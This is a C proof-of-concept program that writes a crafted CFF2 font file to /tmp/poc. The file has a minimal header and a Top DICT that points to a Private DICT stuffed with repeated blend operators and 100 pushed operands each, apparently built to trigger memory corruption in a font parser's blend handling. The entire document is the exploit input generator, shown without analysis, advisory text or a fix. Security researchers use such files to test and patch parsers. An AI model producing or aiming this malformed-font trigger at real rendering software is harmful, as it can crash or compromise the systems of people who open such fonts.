#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* CFF2 Header (4 bytes) */
    fputc(0x02, f); /* major = 2 */
    fputc(0x00, f); /* minor = 0 */
    fputc(0x05, f); /* hdrSize = 5 */
    fputc(0x09, f); /* topDictLength = 9 */

    /* Name INDEX: count=0 (2 bytes) */
    fputc(0x00, f); fputc(0x00, f);

    /* Top DICT INDEX: count=1 */
    fputc(0x00, f); fputc(0x01, f); /* count = 1 */
    fputc(0x01, f);                /* offSize = 1 */
    fputc(0x01, f); fputc(0x0A, f);/* offsets: 1, 10 */

    /* Top DICT data (9 bytes):
       0x1C 0x00 0x00  -> push 0
       0x0F            -> charset
       0x1C 0x02 0x62  -> push 610 (size)
       0x1C 0x00 0x18  -> push 24 (offset)
       0x12            -> Private */
    fputc(0x1C, f); fputc(0x00, f); fputc(0x00, f); /* push 0 */
    fputc(0x0F, f);                                  /* charset */
    fputc(0x1C, f); fputc(0x02, f); fputc(0x62, f); /* push 610 */
    fputc(0x1C, f); fputc(0x00, f); fputc(0x18, f); /* push 24 */
    fputc(0x12, f);                                  /* Private */

    /* String INDEX: count=0 */
    fputc(0x00, f); fputc(0x00, f);

    /* Global Subr INDEX: count=0 */
    fputc(0x00, f); fputc(0x00, f);

    /* Now at offset 24 (Private DICT) */
    /* Private DICT: two blend operations, each with numBlends=20 */
    for (int b = 0; b < 2; b++) {
        /* Push 100 operands, each being 0 (3 bytes each) */
        for (int i = 0; i < 100; i++) {
            fputc(0x1C, f); fputc(0x00, f); fputc(0x00, f); /* value 0 */
        }
        /* Push numBlends = 20 */
        fputc(0x1C, f); fputc(0x00, f); fputc(0x14, f);
        /* Blend operator: 0x10 0x01 */
        fputc(0x10, f); fputc(0x01, f);
    }

    fclose(f);
    return 0;
}